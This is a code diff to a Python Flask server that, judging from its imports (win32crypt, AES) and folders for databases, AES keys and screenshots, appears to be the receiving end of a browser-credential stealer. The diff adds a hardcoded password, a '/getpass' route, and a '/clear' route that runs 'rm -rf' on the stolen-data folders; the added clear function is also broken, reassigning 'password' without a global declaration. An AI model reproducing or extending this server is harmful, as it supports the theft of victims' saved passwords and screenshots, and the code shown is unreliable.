@@ -1,7 +1,7 @@
 import flask
 import time
 import json
-import base64
+import base64,random
 import sqlite3,os
 import requests
 import win32crypt  # type: ignore
@@ -9,6 +9,8 @@ from Cryptodome.Cipher import AES
 from datetime import datetime, timedelta
 from flask import request
 app = flask.Flask(__name__)
+
+password="asdfsdf"
 
 if not os.path.exists("./dbs"):
     os.makedirs("./dbs")
@@ -348,6 +350,39 @@ def saveScreenshot():
         with open(filename+".png", "wb") as f:
             f.write(key)
         return "ok"
+
+@app.route('/clear/<passw>')
+def clear(passw):
+    if password=="":
+        return "run /getpass"
+    elif passw==password:
+        os.system("rm -rf ./dbs/*")
+        os.system("rm -rf ./data/*")
+        os.system("rm -rf ./aesKey/*")
+        os.system("rm -rf ./screenshots/*")
+        os.system("rm -rf ./Json/*")
+        if not os.path.exists("./dbs"):
+            os.makedirs("./dbs")
+        if not os.path.exists("./data"):
+            os.makedirs("./data")
+        if not os.path.exists("./aesKey"):
+            os.makedirs("./aesKey")
+        if not os.path.exists("./screenshots"):
+            os.makedirs("./screenshots")
+        if not os.path.exists("./Json"):
+            os.makedirs("./Json")
+        password=""
+        return "ok"
+    elif passw!=password:
+        password=""
+        return "wrong password"
+@app.route('/getpass')
+def getpass():
+    global password
+    passw=str(random.randint(100000,999999))
+    password=passw
+    print("password:",passw)
+    return "ok"
 
 @app.route('/get')
 def get():
